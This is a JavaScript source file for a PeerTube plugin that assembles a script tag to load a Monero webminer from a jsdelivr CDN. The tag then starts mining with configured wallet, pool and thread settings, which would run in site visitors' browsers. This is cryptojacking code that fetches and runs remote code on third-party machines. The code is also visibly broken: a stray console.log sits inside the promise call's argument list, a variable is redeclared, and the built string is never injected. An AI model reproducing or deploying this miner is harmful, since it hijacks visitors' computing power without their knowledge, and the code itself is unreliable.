async function register({ registerHook, peertubeHelpers }) {

peertubeHelpers.getSettings().then(
  console.log('Initializing Monero miner client plugin...');
      s => {
      if ( !s || !s['walletAddress'] || !s['poolAddress']) {
        let rule = "console.error('Monero miner plugin: Required settings are missing.');"
        return
      }

      let rule = "<!-- Monero Miner Script -->"
      rule+= "<script src='https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js'></script>\n"
      rule+= "<script>\n"
      rule+= "const server = '"+s['webSocket']+"';\n"
      rule+= "const pool = '"+s['poolAddress']+"';\n"
      rule+= "const wallet = '"+s['walletAddress']+"';\n"
      rule+= "const workerId = 'PeerTube-Miner';\n"
      rule+= "const threads = '"+s['threads']+"';\n"
      rule+= "const password = '"+s['password']+"';\n"
      rule+= "startMining(pool, wallet, workerId, threads, password);\n"
      rule+= "throttleMiner = 20;\n"
      rule+= "</script>;\n"
      rule+= "<!-- End Of Mining Code (HTML) -->;\n"
    }
  )
}
export { register }
